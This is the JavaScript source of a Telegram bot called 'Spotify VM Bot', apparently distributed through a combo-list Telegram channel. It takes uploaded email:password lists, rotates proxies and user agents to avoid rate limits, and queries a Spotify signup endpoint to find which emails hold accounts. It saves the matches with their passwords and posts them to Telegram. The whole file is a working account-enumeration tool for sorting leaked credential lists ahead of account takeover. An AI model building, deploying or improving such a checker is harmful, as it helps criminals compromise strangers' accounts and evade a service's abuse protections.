require('dotenv').config();
const fs = require('fs');
const https = require('https');
const { Telegraf, Markup } = require('telegraf');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { randomUA } = require('./ua-helper');

// ⚙️ CONFIGURATION
const CONFIG = {
  API_URL: 'https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email=',
  OUTPUT_FILE: 'Spotify VM.txt',
  CONTACT_NOTE: 'FOR MORE CONFIGS : t.me/mrcombo1services',
  SUCCESS_KEYS: [
    'Ese correo electrónico ya está registrado en una cuenta.',
    'That email is already registered to an account',
    'Cette adresse e-mail est déjà associée à un compte.'
  ],
  FAILURE_KEY: '"status":1',
  CONCURRENCY: 5,
  TIMEOUT: 15000,
  MAX_RETRIES: 2,
  BOT_TOKEN: process.env.BOT_TOKEN,
  OWNER_ID: process.env.OWNER_ID ? parseInt(process.env.OWNER_ID) : null
};

// 🚫 Simple Auth — only YOU can use the bot
function isOwner(userId) {
  return CONFIG.OWNER_ID === null || userId === CONFIG.OWNER_ID;
}

// Global State
let proxies = [];
let bannedProxies = new Set();
let stats = { total: 0, checked: 0, hits: 0, available: 0, errors: 0 };
let isRunning = false;
let currentChatId = null;

// ─────────────────────────────────────────────────────────────────────
// PROXY & EMAIL CHECKER
// ─────────────────────────────────────────────────────────────────────
function loadProxies(path = 'proxies.txt') {
  if (!fs.existsSync(path)) return [];
  return fs.readFileSync(path, 'utf8')
    .split(/\r?\n/)
    .map(l => l.trim())
    .filter(l => l);
}

function getAvailableProxy() {
  const available = proxies.filter(p => !bannedProxies.has(p));
  return available.length ? available[Math.floor(Math.random() * available.length)] : null;
}

async function checkEmail(email, password = '') {
  const proxy = getAvailableProxy();
  const url = `${CONFIG.API_URL}${encodeURIComponent(email)}`;
  const ua = randomUA();

  const options = {
    headers: {
      'Accept': '*/*',
      'Pragma': 'no-cache',
      'User-Agent': ua
    },
    timeout: CONFIG.TIMEOUT,
    rejectUnauthorized: true
  };
  if (proxy) options.agent = new HttpsProxyAgent(proxy);

  return new Promise((resolve) => {
    const req = https.get(url, options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        let type = 'AVAILABLE';
        for (const key of CONFIG.SUCCESS_KEYS) {
          if (body.includes(key)) { type = 'EXISTS'; break; }
        }
        resolve({ email, password, proxy, type, statusCode: res.statusCode });
      });
    });
    req.on('error', () => {
      if (proxy) bannedProxies.add(proxy);
      resolve({ email, password, proxy, type: 'ERROR' });
    });
    req.end();
  });
}

function saveHit(email, password) {
  fs.appendFileSync(CONFIG.OUTPUT_FILE, `${email}:${password || ''}\n`, 'utf8');
}

async function processList(entries, chatId) {
  isRunning = true;
  stats = { total: entries.length, checked: 0, hits: 0, available: 0, errors: 0 };
  
  await bot.telegram.sendMessage(chatId, 
    `🚀 Starting check — ${CONFIG.CONTACT_NOTE}\n` +
    `📋 Total: ${entries.length} | 🔄 Threads: ${CONFIG.CONCURRENCY} | 🕵️ Proxies: ${proxies.length}`
  );

  const queue = [...entries];
  const workers = [];

  for (let i = 0; i < CONFIG.CONCURRENCY; i++) {
    workers.push((async () => {
      while (queue.length > 0 && isRunning) {
        const item = queue.shift();
        if (!item) break;
        const [email, password = ''] = item.split(':');
        const result = await checkEmail(email, password);
        
        stats.checked++;
        if (result.type === 'EXISTS') {
          stats.hits++;
          saveHit(email, password);
          await bot.telegram.sendMessage(chatId, 
            `✅ EXISTS: ${email}\n🔑 Pass: ${password || 'N/A'}\n🕵️ Proxy: ${result.proxy || 'Direct'}`,
            { parse_mode: 'Markdown' }
          );
        } else if (result.type === 'AVAILABLE') {
          stats.available++;
        } else {
          stats.errors++;
        }
        
        if (stats.checked % 20 === 0) {
          const pct = ((stats.checked / stats.total) * 100).toFixed(1);
          await bot.telegram.sendMessage(chatId, 
            `📊 Progress: ${stats.checked}/${stats.total} (${pct}%)\n` +
            `✅ Hits: ${stats.hits} | ❌ Avail: ${stats.available} | ⚠️ Errors: ${stats.errors}`
          );
        }
      }
    })());
  }

  await Promise.all(workers);
  isRunning = false;
  
  await bot.telegram.sendMessage(chatId, 
    `🏁 FINISHED!\n` +
    `📊 Total: ${stats.total}\n✅ Hits: ${stats.hits}\n❌ Available: ${stats.available}\n⚠️ Errors: ${stats.errors}\n` +
    `📂 Saved to: ${CONFIG.OUTPUT_FILE}\n\n${CONFIG.CONTACT_NOTE}`,
    { parse_mode: 'Markdown' }
  );
}

// ─────────────────────────────────────────────────────────────────────
// TELEGRAM BOT SETUP
// ─────────────────────────────────────────────────────────────────────
const bot = new Telegraf(CONFIG.BOT_TOKEN);

// Auth Middleware
bot.use((ctx, next) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply('❌ Unauthorized — This bot is private');
  }
  return next();
});

bot.command('start', (ctx) => {
  ctx.replyWithMarkdown(`
🎵 *Spotify VM Bot* — ${CONFIG.CONTACT_NOTE}

*Commands:*
/upload - Upload wordlist (.txt, one email:pass per line)
/proxies - Upload proxy list
/startcheck - Start checking
/stop - Stop running check
/stats - Show current stats
/download - Download results file
/status - Show bot status

*How to use:*
1. Send /upload and attach your wordlist
2. Send /proxies and attach proxies (optional)
3. Type /startcheck to begin
4. Use /stop anytime to pause
  `);
});

bot.command('stop', (ctx) => {
  isRunning = false;
  ctx.reply('🛑 Stopping check...');
});

bot.command('stats', (ctx) => {
  ctx.replyWithMarkdown(`
📊 *Current Stats:*
Checked: ${stats.checked}/${stats.total}
Hits: ${stats.hits}
Available: ${stats.available}
Errors: ${stats.errors}
Running: ${isRunning ? '✅ Yes' : '❌ No'}
Proxies loaded: ${proxies.length}
  `);
});

bot.command('status', (ctx) => {
  ctx.replyWithMarkdown(`
🤖 *Bot Status:*
Running: ${isRunning ? '🟢 Active' : '🔴 Idle'}
Proxies: ${proxies.length}
Banned proxies: ${bannedProxies.size}
Output file: ${CONFIG.OUTPUT_FILE}
  `);
});

bot.command('download', async (ctx) => {
  if (!fs.existsSync(CONFIG.OUTPUT_FILE)) {
    return ctx.reply('⚠️ No results file found yet. Run a check first!');
  }
  await ctx.replyWithDocument({
    source: CONFIG.OUTPUT_FILE,
    filename: `Spotify_Results_${Date.now()}.txt`
  });
});

// Handle Wordlist Upload
bot.on('document', async (ctx, next) => {
  const doc = ctx.message.document;
  const fileExt = doc.file_name?.split('.').pop()?.toLowerCase();
  
  if (fileExt !== 'txt') {
    return ctx.reply('⚠️ Please upload a .txt file');
  }

  const fileLink = await ctx.telegram.getFileLink(doc.file_id);
  const res = await fetch(fileLink.href);
  const text = await res.text();
  const lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l);

  if (doc.file_name.toLowerCase().includes('prox') || doc.file_name === 'proxies.txt') {
    fs.writeFileSync('proxies.txt', lines.join('\n'));
    proxies = loadProxies();
    bannedProxies.clear();
    ctx.reply(`✅ Loaded ${proxies.length} proxies`);
  } else {
    fs.writeFileSync('mail.txt', lines.join('\n'));
    ctx.reply(`✅ Wordlist saved — ${lines.length} entries`);
  }
});

bot.command('upload', (ctx) => {
  ctx.reply('📄 Send your wordlist file as attachment (.txt)\nFormat: email:password per line');
});

bot.command('proxies', (ctx) => {
  ctx.reply('🕵️ Send your proxy list (.txt)\nFormat: http://user:pass@host:port or http://host:port');
});

bot.command('startcheck', async (ctx) => {
  if (isRunning) return ctx.reply('⚠️ Already running — use /stop first');
  
  const wordlistPath = 'mail.txt';
  if (!fs.existsSync(wordlistPath)) {
    return ctx.reply('⚠️ No wordlist found — use /upload first');
  }
  
  proxies = loadProxies();
  const entries = fs.readFileSync(wordlistPath, 'utf8')
    .split(/\r?\n/)
    .map(l => l.trim())
    .filter(l => l);
  
  if (!entries.length) return ctx.reply('⚠️ Wordlist is empty');
  
  currentChatId = ctx.chat.id;
  await processList(entries, ctx.chat.id);
});

// Health check endpoint for Render
const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.get('/', (req, res) => {
  res.send('Spotify VM Bot is running 🎵 — Check Telegram!');
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', running: isRunning, hits: stats.hits });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🌐 Health check on port ${PORT}`);
});

// Start Bot
bot.launch({ polling: true })
  .then(() => console.log('🤖 Telegram Bot Started'))
  .catch(err => console.error('Bot error:', err));

// Graceful Shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
